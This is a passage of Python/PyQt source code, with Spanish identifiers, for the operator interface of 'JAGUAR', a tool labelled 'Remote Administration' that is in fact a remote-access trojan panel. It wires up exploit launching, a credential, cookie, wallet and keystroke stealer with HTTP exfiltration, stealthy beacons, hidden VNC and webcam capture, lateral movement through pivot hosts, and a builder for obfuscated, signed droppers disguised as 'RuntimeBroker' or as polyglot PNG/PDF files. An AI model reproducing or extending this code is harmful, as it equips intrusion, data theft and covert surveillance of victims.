        root.setSpacing(0)

        top = QFrame()
        top.setObjectName("topbar")
        top.setFixedHeight(80)
        tl = QHBoxLayout(top)
        tl.setContentsMargins(14, 0, 12, 0)
        tl.setSpacing(12)
        logo = QLabel()
        logo.setPixmap(obtener_logo(64))
        logo.setFixedSize(66, 66)
        logo.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo.setStyleSheet("background:#0b0b0d;border:1px solid #ff2b2b;border-radius:10px;")
        tl.addWidget(logo)
        tl.addWidget(QLabel("<b style='color:#ff2b2b;font-size:16pt;'>JAGUAR</b>"
                            "<span style='color:#8a8a92;'> · Remote Administration</span>"))
        tl.addWidget(QLabel("Puerto:"))
        self.in_puerto_srv = QLineEdit(str(self.servidor.puerto))
        self.in_puerto_srv.setFixedWidth(70)
        tl.addWidget(self.in_puerto_srv)
        tl.addStretch()
        self.btn_servidor = QPushButton("▶  Iniciar servidor")
        self.btn_servidor.setStyleSheet(ESTILO_BOTON)
        self.btn_servidor.setCheckable(True)
        self.btn_servidor.clicked.connect(self._toggle_servidor)
        tl.addWidget(self.btn_servidor)
        self.lbl_estado = QLabel("● DETENIDO")
        self.lbl_estado.setStyleSheet("color:#ff2b2b;font-weight:700;padding-right:6px;")
        tl.addWidget(self.lbl_estado)
        root.addWidget(top)

        split = QSplitter(Qt.Orientation.Horizontal)
        split.setHandleWidth(4)

        izq = QWidget()
        izq.setObjectName("panel")
        il = QVBoxLayout(izq)
        il.setContentsMargins(8, 8, 4, 8)
        il.setSpacing(6)
        cab = QHBoxLayout()
        cab.addWidget(QLabel("<b style='color:#ff2b2b;'>CLIENTES</b>"))
        self.lbl_n = QLabel("0")
        self.lbl_n.setStyleSheet(f"color:{TENUE};")
        cab.addWidget(self.lbl_n)
        cab.addStretch()
        self.in_buscar = QLineEdit()
        self.in_buscar.setPlaceholderText("filtrar...")
        self.in_buscar.setFixedWidth(120)
        self.in_buscar.textChanged.connect(lambda _: self._aplicar_filtros())
        cab.addWidget(self.in_buscar)
        # Filtro y orden por SO (RF10).
        self.cmb_filtro_so = QComboBox()
        self.cmb_filtro_so.addItem("SO: todos", "")
        for k, etq in (("windows", "Windows"), ("linux", "Linux"),
                       ("macos", "macOS"), ("android", "Android")):
            self.cmb_filtro_so.addItem(etq, k)
        self.cmb_filtro_so.setFixedWidth(104)
        self.cmb_filtro_so.currentIndexChanged.connect(self._on_filtro_so)
        cab.addWidget(self.cmb_filtro_so)
        self.btn_orden_so = QPushButton("⇅")
        self.btn_orden_so.setFixedWidth(30)
        self.btn_orden_so.setToolTip("Ordenar el árbol por sistema operativo")
        self.btn_orden_so.setStyleSheet(ESTILO_BOTON)
        self.btn_orden_so.clicked.connect(self._ordenar_por_so)
        cab.addWidget(self.btn_orden_so)
        il.addLayout(cab)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(COLS)
        self.tree.setColumnWidth(0, 26)
        self.tree.setColumnWidth(1, 70)
        self.tree.setColumnWidth(2, 120)
        self.tree.setColumnWidth(3, 90)
        self.tree.setColumnWidth(4, 110)
        self.tree.setColumnWidth(5, 70)
        self.tree.setColumnWidth(6, 110)
        self.tree.setRootIsDecorated(False)
        self.tree.setAlternatingRowColors(True)
        self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self._menu_contexto)
        self.tree.itemDoubleClicked.connect(
            lambda i, c: self._abrir_terminal(i.data(0, Qt.ItemDataRole.UserRole)))
        self.tree.itemSelectionChanged.connect(self._mostrar_detalles)
        il.addWidget(self.tree, 1)

        det = QFrame()
        det.setObjectName("detalle")
        dl = QGridLayout(det)
        dl.setContentsMargins(8, 6, 8, 6)
        dl.setHorizontalSpacing(8)
        dl.setVerticalSpacing(2)
        self.det_labels = {}
        campos = [("Host", "host"), ("Usuario", "usuario"), ("SO", "so"),
                  ("Arquitectura", "arquitectura"), ("IP interna", "ip"),
                  ("IP externa", "ip_externa"), ("País", "pais"),
                  ("Ciudad", "ciudad"), ("ISP", "isp"), ("PID", "pid")]
        for i, (etq, clave) in enumerate(campos):
            r, c = divmod(i, 2)
            k = QLabel(f"<span style='color:{TENUE};'>{etq}:</span>")
            v = QLabel("—")
            dl.addWidget(k, r, c * 2)
            dl.addWidget(v, r, c * 2 + 1)
            self.det_labels[clave] = v
        il.addWidget(det)
        split.addWidget(izq)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.w_escaner = self._tab_escaner()
        self.tabs.addTab(self.w_escaner, "  Escáner  ")
        # --- Pestaña Wi-Fi (RF1): persistente, entre Escáner y Exploits ---
        self.panel_wifi = None
        if PanelWifi is not None:
            try:
                self.panel_wifi = PanelWifi(self)
                self.panel_wifi.subred_lista.connect(self._on_subred_wifi)
                self.tabs.addTab(self.panel_wifi, "  📡 Wi-Fi  ")
            except Exception as e:
                self.panel_wifi = None
                self._log(f"[wifi] no se pudo crear la pestaña: {e}")
        self.w_exploits = self._tab_exploits()
        self.tabs.addTab(self.w_exploits, "  Exploits  ")
        self.w_stealer = self._tab_stealer()
        self.tabs.addTab(self.w_stealer, "  Stealer  ")
        self.w_beacons = self._tab_beacons()
        self.tabs.addTab(self.w_beacons, "  Beacons  ")
        self.w_builder = self._tab_builder()
        self.tabs.addTab(self.w_builder, "  Builder  ")
        self.w_log = self._tab_log()
        self.tabs.addTab(self.w_log, "  Registro  ")
        self.w_lateral = self._tab_lateral()
        self.tabs.addTab(self.w_lateral, "  Lateral  ")
        split.addWidget(self.tabs)

        split.setStretchFactor(0, 0)
        split.setStretchFactor(1, 1)
        split.setSizes([430, 930])
        root.addWidget(split, 1)

    def _ir_tab(self, widget):
        """Va a la pestaña de `widget` sin depender de indices fijos (al meter
        la pestaña Wi-Fi los indices de Stealer y Exploits se desplazan)."""
        idx = self.tabs.indexOf(widget)
        if idx >= 0:
            self.tabs.setCurrentIndex(idx)

    def _tab_escaner(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Objetivo (IP / rango / subred):"), 0, 0)
        self.in_objetivo = QLineEdit(escaner.detectar_subred())
        form.addWidget(self.in_objetivo, 0, 1)
        form.addWidget(QLabel("Puertos (22,80,443 / 1-1024):"), 1, 0)
        self.in_puertos = QLineEdit()
        self.in_puertos.setPlaceholderText("vacío = top comunes")
        form.addWidget(self.in_puertos, 1, 1)
        l.addLayout(form)
        fila = QHBoxLayout()
        self.btn_escanear = QPushButton("▶  Escanear")
        self.btn_escanear.setStyleSheet(ESTILO_BOTON)
        self.btn_escanear.clicked.connect(self._escanear)
        fila.addWidget(self.btn_escanear)
        self.chk_nmap = QPushButton("nmap: SÍ")
        self.chk_nmap.setCheckable(True)
        self.chk_nmap.setChecked(True)
        self.chk_nmap.setStyleSheet(ESTILO_BOTON)
        self.chk_nmap.clicked.connect(
            lambda: self.chk_nmap.setText(f"nmap: {'SÍ' if self.chk_nmap.isChecked() else 'NO'}"))
        fila.addWidget(self.chk_nmap)
        self.btn_rec = QPushButton("🎯  Recomendar exploits")
        self.btn_rec.setStyleSheet(ESTILO_BOTON)
        self.btn_rec.clicked.connect(self._recomendar_desde_escaneo)
        fila.addWidget(self.btn_rec)
        self.btn_verificar = QPushButton("🔍  Verificar (nmap NSE)")
        self.btn_verificar.setStyleSheet(ESTILO_BOTON)
        self.btn_verificar.setToolTip(
            "Lanza el script NSE del exploit seleccionado para confirmarlo.")
        self.btn_verificar.clicked.connect(self._verificar_nse)
        fila.addWidget(self.btn_verificar)
        self.btn_nativo = QPushButton("⚡  Explotar (nativo)")
        self.btn_nativo.setStyleSheet(ESTILO_BOTON)
        self.btn_nativo.setToolTip(
            "Explotador en Python puro. Deshabilitado si el puerto no tiene uno.")
        self.btn_nativo.clicked.connect(self._explotar_nativo)
        fila.addWidget(self.btn_nativo)
        self.btn_desplegar = QPushButton("🚀  Desplegar agente")
        self.btn_desplegar.setStyleSheet(ESTILO_BOTON)
        self.btn_desplegar.setToolTip(
            "Movimiento lateral desde el cliente pivote; si no hay pivote, "
            "copia el comando al portapapeles.")
        self.btn_desplegar.clicked.connect(self._desplegar_agente)
        fila.addWidget(self.btn_desplegar)
        self.btn_wifi = QPushButton("📡  Wi-Fi")
        self.btn_wifi.setStyleSheet(ESTILO_BOTON)
        self.btn_wifi.clicked.connect(self._escanear_wifi)
        fila.addWidget(self.btn_wifi)
        fila.addStretch()
        l.addLayout(fila)
        self.barra = QProgressBar()
        self.barra.setValue(0)
        self.barra.setFixedHeight(16)
        l.addWidget(self.barra)
        self.res_escaner = QTreeWidget()
        self.res_escaner.setHeaderLabels(["IP", "Host", "Puerto", "Servicio", "Banner"])
        self.res_escaner.setColumnWidth(0, 140)
        self.res_escaner.setAlternatingRowColors(True)
        self.res_escaner.setRootIsDecorated(False)
        self.res_escaner.itemDoubleClicked.connect(self._detalle_host)
        self.res_escaner.itemSelectionChanged.connect(self._refrescar_botones_escaner)
        l.addWidget(self.res_escaner, 1)
        self.lbl_hostdet = QLabel("doble clic en un host para ver su detalle")
        self.lbl_hostdet.setStyleSheet(f"color:{TENUE};")
        l.addWidget(self.lbl_hostdet)
        self.out_hostdet = QPlainTextEdit()
        self.out_hostdet.setReadOnly(True)
        self.out_hostdet.setFixedHeight(120)
        self.out_hostdet.setStyleSheet(
            "background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_hostdet)
        self.out_nativo = QPlainTextEdit()
        self.out_nativo.setReadOnly(True)
        self.out_nativo.setFixedHeight(120)
        l.addWidget(self.out_nativo)
        return w

    def _tab_exploits(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.addWidget(QLabel("Exploits según puertos abiertos (prioridad arriba):"))
        self.tree_exploits = QTreeWidget()
        self.tree_exploits.setHeaderLabels(["IP", "Puerto", "Exploit", "CVE", "Riesgo", "SO", "Comando"])
        self.tree_exploits.setColumnWidth(0, 120)
        self.tree_exploits.setColumnWidth(2, 190)
        self.tree_exploits.setAlternatingRowColors(True)
        self.tree_exploits.setRootIsDecorated(False)
        self.tree_exploits.itemSelectionChanged.connect(self._refrescar_botones_exploits)
        l.addWidget(self.tree_exploits, 1)
        fila = QHBoxLayout()
        b1 = QPushButton("➜  Lanzar en cliente")
        b1.setStyleSheet(ESTILO_BOTON)
        b1.clicked.connect(self._lanzar_exploit)
        b2 = QPushButton("📋  Copiar comando")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._copiar_exploit)
        b3 = QPushButton("🔍  Verificar (nmap NSE)")
        b3.setStyleSheet(ESTILO_BOTON)
        b3.clicked.connect(self._verificar_nse)
        b4 = QPushButton("⚡  Ejecutar nativo")
        b4.setStyleSheet(ESTILO_BOTON)
        b4.clicked.connect(self._ejecutar_exploit_nativo)
        b5 = QPushButton("🚀  Desplegar agente")
        b5.setStyleSheet(ESTILO_BOTON)
        b5.clicked.connect(self._desplegar_agente)
        for b in (b1, b2, b3, b4, b5):
            fila.addWidget(b)
        fila.addStretch()
        l.addLayout(fila)
        self.out_exploits = QPlainTextEdit()
        self.out_exploits.setReadOnly(True)
        self.out_exploits.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_exploits)
        return w

    def _tab_stealer(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        l.addWidget(QLabel("<b style='color:#ff2b2b;'>STEALER (estilo PureLogs)</b> — "
                           "recolecta credenciales, cookies, wallets, apps, WiFi, "
                           "teclado y pantalla, y exfiltra en ZIP."))
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("URL de exfiltración (HTTP POST):"), 0, 0)
        self.in_st_url = QLineEdit()
        self.in_st_url.setPlaceholderText("http://tu-servidor/subir.php  (vacío = solo local)")
        form.addWidget(self.in_st_url, 0, 1)
        form.addWidget(QLabel("Intervalo auto (s):"), 0, 2)
        self.in_st_int = QLineEdit("900")
        self.in_st_int.setFixedWidth(80)
        form.addWidget(self.in_st_int, 0, 3)
        l.addLayout(form)

        casillas = QHBoxLayout()
        self.st_chk = {}
        for clave, etq in (("navegadores", "Navegadores"), ("wallets", "Wallets"),
                           ("apps", "Aplicaciones"), ("wifi", "WiFi"),
                           ("sistema", "Sistema"), ("keylog", "Teclado"),
                           ("screenshot", "Pantalla")):
            c = QCheckBox(etq)
            c.setChecked(True)
            self.st_chk[clave] = c
            casillas.addWidget(c)
        casillas.addStretch()
        l.addLayout(casillas)

        fila = QHBoxLayout()
        for txt, fn in [("🕵  Recolectar en seleccionado", self._stealer_recolectar),
                        ("📊  Estado", self._stealer_estado),
                        ("📥  Traer paquete (.zip)", self._stealer_traer),
                        ("☁  Exfiltrar ahora", self._stealer_exfil),
                        ("🔁  Auto ON/OFF", self._stealer_auto)]:
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            fila.addWidget(b)
        fila.addStretch()
        l.addLayout(fila)

        self.out_stealer = QPlainTextEdit()
        self.out_stealer.setReadOnly(True)
        self.out_stealer.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_stealer, 1)
        return w

    def _tab_beacons(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)

        l.addWidget(QLabel("<b style='color:#ff2b2b;'>RECON DEL CLIENTE</b> "
                           "(se ejecuta en la víctima, salida abajo):"))
        fila_recon = QHBoxLayout()
        for txt, cmd in [("whoami", "whoami"), ("netstat", "netstat"),
                         ("arp", "arp"), ("ipconfig", "ipconfig"),
                         ("procesos", "tasklist"), ("usuarios", "net_user"),
                         ("compartidos", "net_view"), ("tareas", "schtasks_list"),
                         ("unidades", "drives"), ("variables", "env"),
                         ("escaneo LAN", "portscan"), ("spawn", "spawn")]:
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, c=cmd: self._recon(c))
            fila_recon.addWidget(b)
        l.addLayout(fila_recon)

        fila_ps = QHBoxLayout()
        fila_ps.addWidget(QLabel("PowerShell:"))
        self.in_ps = QLineEdit()
        self.in_ps.setPlaceholderText("Get-Process | Select -First 10")
        self.in_ps.returnPressed.connect(
            lambda: self._recon("powershell", {"comando": self.in_ps.text()}))
        fila_ps.addWidget(self.in_ps)
        b_ps = QPushButton("Ejecutar PS")
        b_ps.setStyleSheet(ESTILO_BOTON)
        b_ps.clicked.connect(
            lambda: self._recon("powershell", {"comando": self.in_ps.text()}))
        fila_ps.addWidget(b_ps)
        l.addLayout(fila_ps)

        self.out_beacon = QPlainTextEdit()
        self.out_beacon.setReadOnly(True)
        self.out_beacon.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_beacon, 2)

        # --- clientes activos + beacon (RF13) ---------------------------
        l.addWidget(QLabel("<b style='color:#ff2b2b;'>CLIENTES ACTIVOS</b> — "
                           "selecciona uno para operar; el estado de beacon se "
                           "refresca solo."))
        fila_c = QHBoxLayout()
        self.lista_clientes = QListWidget()
        self.lista_clientes.setMaximumHeight(110)
        self.lista_clientes.itemDoubleClicked.connect(self._seleccionar_desde_lista)
        self.lista_clientes.itemSelectionChanged.connect(self._seleccionar_desde_lista)
        fila_c.addWidget(self.lista_clientes, 1)
        col_b = QVBoxLayout()
        for txt, fn in (("🎯 Seleccionar en árbol", self._seleccionar_desde_lista),
                        ("⟳ Refrescar", self._beacon_refrescar)):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            col_b.addWidget(b)
        col_b.addStretch()
        fila_c.addLayout(col_b)
        l.addLayout(fila_c)

        l.addWidget(QLabel("Beacon: el agente reporta cada X segundos con jitter."))
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Sleep (segundos):"), 0, 0)
        self.in_sleep = QLineEdit("5")
        self.in_sleep.setFixedWidth(90)
        form.addWidget(self.in_sleep, 0, 1, Qt.AlignmentFlag.AlignLeft)
        form.addWidget(QLabel("Jitter (%):"), 1, 0)
        self.in_jitter = QLineEdit("20")
        self.in_jitter.setFixedWidth(90)
        form.addWidget(self.in_jitter, 1, 1, Qt.AlignmentFlag.AlignLeft)
        l.addLayout(form)
        fila = QHBoxLayout()
        for txt, fn in (("Aplicar a seleccionado", self._beacon_sel),
                        ("Aplicar a TODOS", self._beacon_todos),
                        ("⏹ Quitar beacon (normal)", self._beacon_quitar),
                        ("📡 Beacon sigiloso a todos", self._beacon_sigiloso)):
            b = QPushButton(txt)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            fila.addWidget(b)
        fila.addStretch()
        l.addLayout(fila)
        self.tree_beacons = QTreeWidget()
        self.tree_beacons.setHeaderLabels(["ID", "Host", "IP", "SO", "Sleep", "Jitter", "Estado"])
        self.tree_beacons.setColumnWidth(0, 80)
        self.tree_beacons.setAlternatingRowColors(True)
        self.tree_beacons.setRootIsDecorated(False)
        l.addWidget(self.tree_beacons, 1)
        return w

    def _tab_builder(self):
        cfg = config.cargar()
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Host de retorno (DDNS / IP controlador):"), 0, 0)
        self.in_bhost = QLineEdit(cfg["host"])
        form.addWidget(self.in_bhost, 0, 1)
        self.btn_ip_pub = QPushButton("🌍 IP pública")
        self.btn_ip_pub.setStyleSheet(ESTILO_BOTON)
        self.btn_ip_pub.clicked.connect(self._detectar_ip_publica)
        form.addWidget(self.btn_ip_pub, 0, 2)
        self.btn_ddns = QPushButton("🌐 DDNS")
        self.btn_ddns.setStyleSheet(ESTILO_BOTON)
        self.btn_ddns.clicked.connect(lambda: self.in_bhost.setText(config.cargar()["host"]))
        form.addWidget(self.btn_ddns, 0, 3)
        form.addWidget(QLabel("Puerto agente:"), 1, 0)
        self.in_bpuerto = QLineEdit(str(cfg["puerto"]))
        self.in_bpuerto.setFixedWidth(90)
        form.addWidget(self.in_bpuerto, 1, 1, Qt.AlignmentFlag.AlignLeft)
        form.addWidget(QLabel("Puerto HTTP droppers:"), 1, 2)
        self.in_bhttp = QLineEdit("8080")
        self.in_bhttp.setFixedWidth(90)
        form.addWidget(self.in_bhttp, 1, 3, Qt.AlignmentFlag.AlignLeft)
        l.addLayout(form)
        self.in_bhost.editingFinished.connect(self._guardar_config)
        self.in_bpuerto.editingFinished.connect(self._guardar_config)

        form2 = QGridLayout()
        form2.setHorizontalSpacing(8)
        form2.addWidget(QLabel("Nombre exe:"), 0, 0)
        self.in_bnombre = QLineEdit("RuntimeBroker")
        form2.addWidget(self.in_bnombre, 0, 1)
        form2.addWidget(QLabel("Icono (.ico/.png/.exe):"), 0, 2)
        self.in_bicono = QLineEdit()
        form2.addWidget(self.in_bicono, 0, 3)
        b_ico = QPushButton("📁")
        b_ico.setFixedWidth(34)
        b_ico.setStyleSheet(ESTILO_BOTON)
        b_ico.clicked.connect(self._buscar_icono)
        form2.addWidget(b_ico, 0, 4)
        form2.addWidget(QLabel("Cert (.pfx):"), 1, 0)
        self.in_bcert = QLineEdit()
        form2.addWidget(self.in_bcert, 1, 1)
        form2.addWidget(QLabel("Pass cert:"), 1, 2)
        self.in_bpass = QLineEdit()
        self.in_bpass.setEchoMode(QLineEdit.EchoMode.Password)
        form2.addWidget(self.in_bpass, 1, 3)
        form2.addWidget(QLabel("UPX dir:"), 2, 0)
        self.in_bupx = QLineEdit()
        form2.addWidget(self.in_bupx, 2, 1, 1, 3)
        b_upx = QPushButton("📁")
        b_upx.setFixedWidth(34)
        b_upx.setStyleSheet(ESTILO_BOTON)
        b_upx.clicked.connect(self._buscar_upx)
        form2.addWidget(b_upx, 2, 4)
        l.addLayout(form2)

        form3 = QHBoxLayout()
        form3.addWidget(QLabel("Compilador:"))
        self.in_bcomp = QComboBox()
        self.in_bcomp.addItems(["pyinstaller", "auto", "nuitka"])
        self.in_bcomp.setToolTip("pyinstaller = rapido | auto = Nuitka si esta | nuitka = forzar")
        form3.addWidget(self.in_bcomp)
        self.chk_pyarmor = QCheckBox("Ofuscar con PyArmor")
        self.chk_pyarmor.setChecked(True)
        form3.addWidget(self.chk_pyarmor)
        form3.addStretch()
        l.addLayout(form3)

        grid = QGridLayout()
        botones = [
            ("Generar TODO", self._build_todo), (".exe", lambda: self._build_uno("exe")),
            (".py", lambda: self._build_uno("py")),
            (".bat", lambda: self._build_uno("bat")), (".vbs", lambda: self._build_uno("vbs")),
            (".ps1", lambda: self._build_uno("ps1")), (".lnk", lambda: self._build_uno("lnk")),
            (".png polyglot", lambda: self._build_uno("png")),
            (".png estego", lambda: self._build_uno("png_stego")),
            (".pdf polyglot", lambda: self._build_uno("pdf")),
            ("macro .bas", lambda: self._build_uno("macro")),
            (".hta", lambda: self._build_uno("hta")), ("🌐 Servir dist", self._servir_dist),
        ]
        for i, (t, fn) in enumerate(botones):
            b = QPushButton(t)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(fn)
            grid.addWidget(b, i // 4, i % 4)
        l.addLayout(grid)
        self.out_builder = QPlainTextEdit()
        self.out_builder.setReadOnly(True)
        l.addWidget(self.out_builder, 1)
        return w

    def _tab_log(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;border:none;")
        l.addWidget(self.log_text, 1)
        return w

    def _tab_lateral(self):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 10, 10, 10)
        l.setSpacing(6)
        l.addWidget(QLabel("<b style='color:#ff2b2b;'>MOVIMIENTO LATERAL</b> — "
                           "ejecuta el payload en otro host usando el cliente "
                           "seleccionado como pivote (estilo 'jump' de Cobalt Strike)."))
        form = QGridLayout()
        form.setHorizontalSpacing(8)
        form.addWidget(QLabel("Cliente pivote:"), 0, 0)
        self.lbl_pivote = QLabel("(selecciona uno en la lista)")
        self.lbl_pivote.setStyleSheet(f"color:{TENUE};")
        form.addWidget(self.lbl_pivote, 0, 1, 1, 3)
        form.addWidget(QLabel("Host destino:"), 1, 0)
        self.in_lat_target = QLineEdit()
        self.in_lat_target.setPlaceholderText("IP o nombre del host remoto (ej. 192.168.1.50)")
        form.addWidget(self.in_lat_target, 1, 1)
        form.addWidget(QLabel("Técnica:"), 1, 2)
        self.cb_lat_tecnica = QComboBox()
        self.cb_lat_tecnica.addItems(lateral.TECNICAS)
        form.addWidget(self.cb_lat_tecnica, 1, 3)
        form.addWidget(QLabel("URL payload:"), 2, 0)
        self.in_lat_url = QLineEdit()
        form.addWidget(self.in_lat_url, 2, 1, 1, 3)
        form.addWidget(QLabel("Usuario:"), 3, 0)
        self.in_lat_user = QLineEdit()
        form.addWidget(self.in_lat_user, 3, 1)
        form.addWidget(QLabel("Password:"), 3, 2)
        self.in_lat_pass = QLineEdit()
        self.in_lat_pass.setEchoMode(QLineEdit.EchoMode.Password)
        form.addWidget(self.in_lat_pass, 3, 3)
        l.addLayout(form)

        fila = QHBoxLayout()
        b1 = QPushButton("🚀  Jump (desplegar y ejecutar)")
        b1.setStyleSheet(ESTILO_BOTON)
        b1.clicked.connect(self._lateral_jump)
        b2 = QPushButton("🧹  Limpiar servicio/tarea")
        b2.setStyleSheet(ESTILO_BOTON)
        b2.clicked.connect(self._lateral_limpiar)
        b3 = QPushButton("🔎  Rellenar URL desde Builder")
        b3.setStyleSheet(ESTILO_BOTON)
        b3.clicked.connect(self._lateral_autourl)
        fila.addWidget(b1)
        fila.addWidget(b2)
        fila.addWidget(b3)
        fila.addStretch()
        l.addLayout(fila)

        self.out_lateral = QPlainTextEdit()
        self.out_lateral.setReadOnly(True)
        self.out_lateral.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        l.addWidget(self.out_lateral, 1)
        return w

    # ================================================================= servidor
    def _toggle_servidor(self):
        if self.servidor_activo:
            self.servidor.detener()
            self.servidor_activo = False
            self.btn_servidor.setText("▶  Iniciar servidor")
            self.btn_servidor.setChecked(False)
            self.lbl_estado.setText("● DETENIDO")
            self.lbl_estado.setStyleSheet("color:#ff2b2b;font-weight:700;padding-right:6px;")
        else:
            try:
                puerto = int(self.in_puerto_srv.text().strip() or self.servidor.puerto)
                self.servidor.iniciar(puerto)
                self.servidor_activo = True
                self.in_bpuerto.setText(str(puerto))
                self.btn_servidor.setText("⏹  Detener servidor")
                self.btn_servidor.setChecked(True)
                self.lbl_estado.setText(f"● ACTIVO :{self.servidor.puerto}")
                self.lbl_estado.setStyleSheet("color:#3ddc4a;font-weight:700;padding-right:6px;")
            except Exception as e:
                QMessageBox.critical(self, "Servidor", str(e))

    def iniciar_servidor(self):
        if not self.servidor_activo:
            self._toggle_servidor()

    def detener_servidor(self):
        if self.servidor_activo:
            self._toggle_servidor()

    def _carpeta_capturas(self, cid):
        nombre = "cliente"
        if cid in self.clientes:
            nombre = self.clientes[cid]["item"].text(2) or "cliente"
        nombre = "".join(ch for ch in nombre if ch.isalnum() or ch in "-_") or "cliente"
        carpeta = os.path.join(os.path.expanduser("~"), "JaguarScreenshots",
                               f"{nombre}_{cid[:8]}")
        os.makedirs(carpeta, exist_ok=True)
        return carpeta

    def _on_cliente_conectado(self, cid, info):
        it = QTreeWidgetItem(["", cid[:8], info.get("host", "?"), info.get("usuario", "?"),
                              info.get("so", "?"), info.get("arquitectura", "?"),
                              info.get("ip", "?"), "…", "", ""])
        it.setData(0, Qt.ItemDataRole.UserRole, cid)
        f = it.font(0)
        f.setPointSize(11)
        it.setFont(0, f)
        self.tree.addTopLevelItem(it)
        self.clientes[cid] = {"item": it, "info": info, "beacon": None}
        self._carpeta_capturas(cid)     # crea la carpeta de capturas del cliente
        self._refrescar_conteo()
        self._beacon_refrescar()
        self._log(f"[+] {info.get('host')} ({cid[:8]}) conectado desde {info.get('ip_externa','?')}")
        ip = info.get("ip_externa") or info.get("ip")
        threading.Thread(target=self._geo_worker, args=(cid, ip), daemon=True).start()

    def _geo_worker(self, cid, ip):
        datos = geo.geolocalizar(ip)
        if datos:
            self._sig_geo.emit(cid, datos)

    def _aplicar_geo(self, cid, datos):
        if cid not in self.clientes:
            return
        it = self.clientes[cid]["item"]
        it.setText(0, geo.bandera(datos.get("cc", "")))
        it.setText(7, datos.get("pais", ""))
        it.setText(8, datos.get("isp", ""))
        self.clientes[cid]["info"].update(datos)

    def _on_cliente_desconectado(self, cid):
        if cid in self.clientes:
            idx = self.tree.indexOfTopLevelItem(self.clientes[cid]["item"])
            self.tree.takeTopLevelItem(idx)
            del self.clientes[cid]
            self._refrescar_conteo()
            self._beacon_refrescar()
            self._log(f"[-] {cid[:8]} desconectado")

    def _on_mensaje_recibido(self, cid, msg):
        tipo = msg.get("tipo")
        if tipo == "evento":
            ev = msg.get("evento")
            datos = msg.get("datos") or {}
            if ev == "hvnc_frame":
                self._enrutar_hvnc(cid, datos)
            elif ev == "escritorio_frame":
                self._enrutar_frame(cid, datos)
            return
        if tipo != "respuesta":
            return
        cmd, ok, datos = msg.get("cmd"), msg.get("ok"), msg.get("datos")

        # --- MODULO MOVIL: se enruta ANTES del log generico (RF12) -------
        if cmd and str(cmd).startswith(PREFIJO_MOVIL):
            self._movil_msg(cid, cmd, datos if ok else {"error": msg.get("error", "")})
            return

        if cmd in ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado") and ok:
            if cmd == "ping":
                ts = self._pings.get(cid)
                if ts and cid in self.clientes:
                    self.clientes[cid]["item"].setText(
                        COL_LAT, f"{int((time.time() - ts) * 1000)} ms")
            return
        if cmd == "hvnc_captura" and ok:
            self._enrutar_hvnc(cid, datos or {})
            return
        if cmd == "hvnc_estado" and ok:
            for dlg in self.hvnc_por_cid.get(cid, []):
                dlg.set_estado(datos or {})
            return
        if cmd == "webcam_frame" and ok:
            self._enrutar_webcam(cid, datos or {})
            return
        if cmd == "clip_get" and ok:
            QApplication.clipboard().setText((datos or {}).get("texto", ""))
            self._log(f"[{cid[:8]}] portapapeles remoto copiado")
            return
        if cmd == "listar_dir" and ok:
            for dlg in self.exploradores_por_cid.get(cid, []):
                dlg.set_listado(datos or {})
            return
        if cmd == "descargar" and ok:
            self._guardar_descarga(cid, datos or {})
            return
        if cmd in CMDS_RECON and ok:
            self._beacon_msg(cid, cmd, datos or {})
            return
        if cmd and cmd.startswith("stealer_") and ok:
            self._stealer_msg(cid, cmd, datos or {})
            return
        if cmd in CMDS_SILENCIOSOS and ok:
            return
        self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
        if ok and cmd == "captura":
            self._enrutar_frame(cid, datos or {})
        if cmd in CMDS_SIN_DATOS:
            return
        for dlg in self.dialogs_por_cid.get(cid, []):
            if not ok:
                dlg.append_respuesta(f"ERROR: {msg.get('error')}")
            else:
                txt = json.dumps(datos, indent=2, ensure_ascii=False) if isinstance(datos, dict) else str(datos)
                dlg.append_respuesta(txt)

    def _log(self, t):
        self.log_text.append(t)

    def _on_builder_log(self, t):
        if hasattr(self, "out_builder") and self.out_builder is not None:
            self.out_builder.appendPlainText(t)

    def _append_nativo(self, t):
        if hasattr(self, "out_nativo") and self.out_nativo is not None:
            self.out_nativo.appendPlainText(t)
        if hasattr(self, "out_exploits") and self.out_exploits is not None:
            self.out_exploits.appendPlainText(t)

